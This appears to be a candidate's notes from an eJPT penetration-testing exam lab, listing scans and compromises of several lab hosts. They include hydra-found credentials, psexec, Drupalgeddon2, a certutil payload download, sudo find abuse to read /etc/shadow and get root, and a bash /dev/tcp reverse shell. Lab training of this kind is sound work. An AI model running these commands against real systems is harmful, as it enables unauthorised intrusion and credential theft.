# Overview 

![[final Letter of Engagement eJPT.pdf]]

![[eJPT Lab Guidelines updated.pdf]]

eJPT exam objectives, domains, and grading criteria: [website](https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester-cert?_ga=2.137268089.876247865.1689040267-1944052468.1687788854&_gac=1.121768697.1689040267.CjwKCAjw2K6lBhBXEiwA5RjtCVyujHMPgJvsJmVCFKBJOdgxoAhwHzeDgf6kaUCXdSxzEs8ibNNaXhoC_P4QAvD_BwE "https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester-cert") 

## Welcome Message
Welcome to the eLearnSecurity Junior Penetration Tester (eJPT) certification exam! This exam will contain approximately 35 questions on the fundamentals of penetration testing. You will have 48 hours to complete the entirety of this exam. Please note that once you begin the exam, you will not be able to pause it. An on-screen timer is provided for your convenience.

Please be sure you have reviewed the [eJPT Lab Guidelines](https://drive.google.com/file/d/1nC9F27uWIo-myZUmLX7FumIrJolod4nr/view) and the [eJPT Letter of Engagement](https://drive.google.com/file/d/1ujkVllVzGUsnKghRQc1xbYoBIgHGKIye/view) before continuing.

During the exam, you may choose to skip more challenging questions and return to them at a later time by using the “pin” feature. Although the exam cannot be paused once it has begun, you are welcome to take breaks as needed.

Please note that for your exam to be submitted and graded, you must manually click the “submit” button prior to the exam timing out. If you do not click the “submit” button, your responses will not be submitted for grading, and, by default, you will be forfeiting your certification attempt.

Additionally, please note that to pass this exam, you must meet the overall certification passing score requirement and the minimum domain requirements set for this exam. Failure to meet both requirements will result in overall exam failure.

Exam feedback or questions can be submitted to the [INE Contact Form](https://ine.com/contact-us).

# Engagement 

# Network 1 
Subnet: 192.168.100.0/24

## Attacker Machine - 192.168.100.5

## Machine - 192.168.100.1
Right now it is ignoring every scan 

## Machine - 192.168.100.50
Hostname: ip-192-168-100-50.us-west-1.compute.internal
OS: Windows, Windows NT WINSERVER-01 6.3 build 9600 (Windows Server 2012 R2 Standard Edition) AMD64
**No other connected networks** 

### System Info
Computer        : WINSERVER-01
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows

### Services
``` Shell
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: WAMPSERVER Homepage
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WINSERVER-01
| Not valid before: 2023-07-14T16:24:20
|_Not valid after:  2024-01-13T16:24:20
|_ssl-date: 2023-07-15T16:37:19+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-01
|   NetBIOS_Domain_Name: WINSERVER-01
|   NetBIOS_Computer_Name: WINSERVER-01
|   DNS_Domain_Name: WINSERVER-01
|   DNS_Computer_Name: WINSERVER-01
|   Product_Version: 6.3.9600
|_  System_Time: 2023-07-15T16:36:37+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:EE:C1:33:CF:7B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/15%OT=80%CT=1%CU=39032%PV=Y%DS=1%DC=D%G=Y%M=06EEC1%T
OS:M=64B2CB3F%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10A%TI=I%CI=I%II=I%
OS:SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301N
OS:W8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%
OS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A
OS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

```
host            port   proto  name               state  info
----            ----   -----  ----               -----  ----
192.168.100.50  80     tcp    http               open   Apache httpd 2.4.51 (Win64) PHP/7.4.26
192.168.100.50  135    tcp    msrpc              open   Microsoft Windows RPC
192.168.100.50  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
192.168.100.50  445    tcp    microsoft-ds       open   Windows Server 2012 R2 Standard 9600 microsoft-ds
192.168.100.50  3307   tcp    opsession-prxy     open
192.168.100.50  3389   tcp    ssl/ms-wbt-server  open
192.168.100.50  5985   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
192.168.100.50  47001  tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
192.168.100.50  49152  tcp    msrpc              open   Microsoft Windows RPC
192.168.100.50  49153  tcp    msrpc              open   Microsoft Windows RPC
192.168.100.50  49154  tcp    msrpc              open   Microsoft Windows RPC
192.168.100.50  49155  tcp    msrpc              open   Microsoft Windows RPC
192.168.100.50  49160  tcp    msrpc              open   Microsoft Windows RPC
192.168.100.50  49170  tcp    msrpc              open   Microsoft Windows RPC
```


### Script Results
``` Shell
Host script results:
|_nbstat: NetBIOS name: WINSERVER-01, NetBIOS user: <unknown>, NetBIOS MAC: 06:ee:c1:33:cf:7b (unknown)
| smb2-time: 
|   date: 2023-07-15T16:36:38
|_  start_date: 2023-07-15T16:24:12
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WINSERVER-01
|   NetBIOS computer name: WINSERVER-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-15T16:36:37+00:00
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
```

#### Port 80 - Wampserver 
Apache Version: 2.4.51
Server Software: Apache/2.4.51 
PHP Version: 7.4.26
Extensions: apache2handler, bcmath, bz2, calendar, com_dotnet, Core, ctype, curl, date, dom, exif, fileinfo, filter, gd, gettext, gmp, hash, iconv, imap, intl, json, ldap, libxml, mbstring, mysqli, mysqlnd, openssl, pcre, PDO, pdo_mysql, pdo_sqlite, Phar, readline, Reflection, session, SimpleXML, soap
MySQL Version: 5.7.36, port 3306
MariaDB Version: 10.6.5, port 3307

Brute Force on `/phpmyadmin/index.php?route=/`, attacking MariaDB, which is being ran on 192.168.100.52, so it could be connecting to that machine 
+ **Credentials**: Root:`<NoPassword>`

#### Wordpress 
Plugins: 
```
meterpreter > ls
Listing: c:\wamp64\www\wordpress\wp-content\plugins
===================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   4096  dir   2022-04-19 02:44:56 +0530  burger-companion
100666/rw-rw-rw-  28    fil   2022-04-19 02:33:53 +0530  index.php
40777/rwxrwxrwx   4096  dir   2022-04-19 02:53:37 +0530  wp-file-manager
40777/rwxrwxrwx   4096  dir   2022-04-19 03:00:16 +0530  wp-responsive-thumbnail-slide
```

### SMB
**credentials**: admin:superman 
+ Found with hydra 
+ Used msfconsole psexec module to get meterpreter shell 
+ Server username: NT AUTHORITY\SYSTEM
+ Confirm OS: Microsoft Windows Server 2012 R2 Standard

No other connected networks to this one 

Enumeration 
+ Found that the MariaDB database has a default account of root, and then no password
+ Creating a MySQL user: `CREATE USER user1 IDENTIFIED by 'pass1';`
+ Granting it all privileges: `GRANT ALL PRIVILEGES ON *.* TO user1@'%'; `

Users:
``` Shell
C:\Users\mike>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
admin                    Administrator            Guest                    
mike                     vince                    
The command completed with one or more errors.
```

``` Shell
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-16 08:44:05
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 4 login tries (l:1/p:4), ~4 tries per task
[DATA] attacking smb://192.168.100.50:445/
[445][smb] host: 192.168.100.50   login: mike   password: diamond
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-16 08:44:05
root@kali:~#
```

Find mysqld process: 
``` 
tasklist | findstr 1528
mysqld.exe                    1528 Services                   0    111,900 K
```
+ which is running on 3307:
``` 
PS C:\wamp64\www\wordpress> netstat -ano | findstr 3307
netstat -ano | findstr 3307
  TCP    0.0.0.0:3307           0.0.0.0:0              LISTENING       1528
```

## Machine - 192.168.100.51
Hostname: ip-192-168-100-51.us-west-1.compute.internal, WINSERVER-02
OS: Windows
**No other connected networks**

### Services 
``` Shell
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-19-22  02:25AM       <DIR>          aspnet_client
| 04-19-22  01:19AM                 1400 cmdasp.aspx
| 04-19-22  12:17AM                99710 iis-85.png
| 04-19-22  12:17AM                  701 iisstart.htm
|_04-19-22  02:13AM                   22 robots.txt.txt
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/8.5
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Sat, 15 Jul 2023 16:36:38 GMT
|   Directory Listing: 
|     http://ip-192-168-100-51.us-west-1.compute.internal/
|     http://ip-192-168-100-51.us-west-1.compute.internal/aspnet_client/
|     http://ip-192-168-100-51.us-west-1.compute.internal/cmdasp.aspx
|     http://ip-192-168-100-51.us-west-1.compute.internal/iis-85.png
|     http://ip-192-168-100-51.us-west-1.compute.internal/iisstart.htm
|_    http://ip-192-168-100-51.us-west-1.compute.internal/robots.txt.txt
|_http-svn-info: ERROR: Script execution failed (use -d to debug)
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2023-07-15T16:37:19+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-02
|   NetBIOS_Domain_Name: WINSERVER-02
|   NetBIOS_Computer_Name: WINSERVER-02
|   DNS_Domain_Name: WINSERVER-02
|   DNS_Computer_Name: WINSERVER-02
|   Product_Version: 6.3.9600
|_  System_Time: 2023-07-15T16:36:37+00:00
| ssl-cert: Subject: commonName=WINSERVER-02
| Not valid before: 2023-07-14T16:24:07
|_Not valid after:  2024-01-13T16:24:07
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:D8:88:05:72:65 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/15%OT=21%CT=1%CU=39781%PV=Y%DS=1%DC=D%G=Y%M=06D888%T
OS:M=64B2CB3F%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%II=I
OS:%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301
OS:NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000
OS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
OS:%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Scripts 
``` Shell
Host script results:
| smb2-time: 
|   date: 2023-07-15T16:36:39
|_  start_date: 2023-07-15T16:24:00
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: WINSERVER-02, NetBIOS user: <unknown>, NetBIOS MAC: 06:d8:88:05:72:65 (unknown)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
```

#### Web
The web server has a function that can run commands on it, used the `hta_server` module to run a server that downloaded the malicious power shell script, with `certutil`, and then ran it with `.\` 
+ Can run commands via: `192.168.100.51`
+ that got a privileged meterpreter session

## Machine - 192.168.100.52
Hostname: ip-192-168-100-52
OS: Linux, Ubuntu 
potential other networks called `br` 

### Services
``` Shell
Nmap scan report for ip-192-168-100-52.us-west-1.compute.internal (192.168.100.52)
Host is up (0.00043s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8c:59:1a:e2:24:62:76:67:9b:52:30:5e:a1:64:6f:3c (RSA)
|   256 d6:b6:52:f9:37:f2:4b:0a:be:0a:d5:c4:b4:3d:32:8d (ECDSA)
|_  256 a2:d9:17:2d:8c:06:1c:27:dd:2c:27:b0:1b:42:3f:99 (ED25519)
80/tcp   open  http          Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-02-21 17:28  drupal/
|_
|_http-title: Index of /
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 4.13.17-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 38
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ODBCClient, FoundRows, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: [OYSqcz[:LQ4Ooc$'7~9
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server xrdp
MAC Address: 06:AC:4E:0E:2A:27 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/15%OT=21%CT=1%CU=31904%PV=Y%DS=1%DC=D%G=Y%M=06AC4E%T
OS:M=64B2CB3F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Scripts 
``` Shell
Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.13.17-Ubuntu)
|   Computer name: ip-192-168-100-52
|   NetBIOS computer name: IP-192-168-100-52\x00
|   Domain name: us-west-1.compute.internal
|   FQDN: ip-192-168-100-52.us-west-1.compute.internal
|_  System time: 2023-07-15T16:36:39+00:00
| smb2-time: 
|   date: 2023-07-15T16:36:39
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: IP-192-168-100-, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

#### Web Server
Runs a Drupal site
Made a fake User account: JamesBond, JamesBond@gmail.com
+ It will let me know if that email is already registered, can use this to check what the admin password is 
+ Made an account for: `admin@syntexd.com`, `administrator@syntexd.com`,  `administrator@syntex.com`, `admin-user@syntex.com`
+ `admin@syntex.com` already exists, which verifies it is the email of the admin user on the Drupal site
+ Can also use the Request new password to find valid user accounts

No luck brute forcing, getting temporary blocks 

Change log exposes version on `drupal/CHANGELOG.txt`:
``` txt
Drupal 7.57, 2018-02-21
-----------------------
- Fixed security issues (multiple vulnerabilities). See SA-CORE-2018-001.
```

found `xmlrpc.php`
the module `php_xmlrpc_eval` can do Arbitrary code execution:
``` Text
This module exploits an arbitrary code execution flaw discovered in 
  many implementations of the PHP XML-RPC module. This flaw is 
  exploitable through a number of PHP web applications, including but 
  not limited to Drupal, Wordpress, Postnuke, and TikiWiki.
```
+ Did not work
http://192.168.100.52/drupal/xmlrpc.php

Drupalgeddon2 vulnerability
Used: `unix/webapp/drupal_drupalgeddon2` msfconsole module 
+ Got a PHP shell: `Server username: www-data`
+ https://vulners.com/seebug/SSV:97207
+ https://nvd.nist.gov/vuln/detail/cve-2018-7600
	+ A 9.8 Vulnerability 


#### FTP 
Interesting PHP sites:
```
---- Scanning URL: http://192.168.100.52/drupal/ ----
+ http://192.168.100.52/drupal/cron.php (CODE:403|SIZE:7872)                                      
+ http://192.168.100.52/drupal/index.php (CODE:200|SIZE:10309)                                    
+ http://192.168.100.52/drupal/install.php (CODE:200|SIZE:3333)                                   
+ http://192.168.100.52/drupal/update.php (CODE:403|SIZE:4204)                                    
+ http://192.168.100.52/drupal/xmlrpc.php (CODE:200|SIZE:42)
```

Anon login allowed, get the following text file:
``` txt
Greetings gentlemen!

- I have setup the server successfully and have configured Drupal.
- Your Drupal usernames are exactly the same as your user account passwords on this server. Contact me to get your Drupal passwords.
- I was too busy to setup a file sharing server so i will be posting the updates here.

- admin
```
+ So we can crack the ssh and ftp for some valid logins 
+ Found **credentials** `auditor:qwertyuiop` and `dbadmin:sayang`

`etc/passwd`:
``` txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
rtkit:x:113:119:RealtimeKit,,,:/proc:/usr/sbin/nologin
xrdp:x:114:122::/run/xrdp:/usr/sbin/nologin
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:116:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:117:123:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:118:124:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
pulse:x:119:125:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:120:127::/var/lib/geoclue:/usr/sbin/nologin
saned:x:121:129::/var/lib/saned:/usr/sbin/nologin
colord:x:122:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
sddm:x:123:131:Simple Desktop Display Manager:/var/lib/sddm:/bin/false
gdm:x:124:132:Gnome Display Manager:/var/lib/gdm3:/bin/false
auditor:x:1001:1001::/home/auditor:/bin/bash
dbadmin:x:1002:1002::/home/dbadmin:/bin/bash
mysql:x:125:133:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:126:137:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

### SSH
Found credentials `auditor:qwertyuiop`
+ auditor as SUDO permissions to run `/usr/bin/find` 
+ Can read files via: `find .ssh/authorized_keys -exec cat {} +`
+ Can get etc shadow: `find /etc/shadow -exec cat {} +`
+ Including the flag: `ind root/flag.txt -exec cat {} +` : `5087ae132b97475e9b8343e7d7083cef` 
+ Become root: `find /usr/bin/ -name find -exec /bin/bash -ip \;` 
+ add auditor to sudo group: `usermod -aG sudo`
+ run reverse shell: 
``` shell
bash -i >& /dev/tcp/192.168.100.5/4451 0>&1
```
+ start a handler for it in msf and then upgraded the session with `shell_to_meterpreter`

Check running services based on their port with: `lsof -i TCP:PORTNUMBER`

Linux version: 
```
root@ip-192-168-100-52:/# uname -r
5.13.0-1021-aws
```

## Machine - 192.168.100.55
Hostname: WINSERVER-03
OS: Windows 
Connected to an internal network: 192.168.0.0/24, with it being 192.168.0.50

### Services
``` Shell
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINSERVER-03
| Not valid before: 2023-07-14T16:24:14
|_Not valid after:  2024-01-13T16:24:14
|_ssl-date: 2023-07-15T16:37:19+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-03
|   NetBIOS_Domain_Name: WINSERVER-03
|   NetBIOS_Computer_Name: WINSERVER-03
|   DNS_Domain_Name: WINSERVER-03
|   DNS_Computer_Name: WINSERVER-03
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-15T16:36:37+00:00
MAC Address: 06:A0:B1:9B:AD:E3 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/15%OT=80%CT=1%CU=37336%PV=Y%DS=1%DC=D%G=Y%M=06A0B1%T
OS:M=64B2CB3F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10F%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Scripts 
``` Shell
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: WINSERVER-03
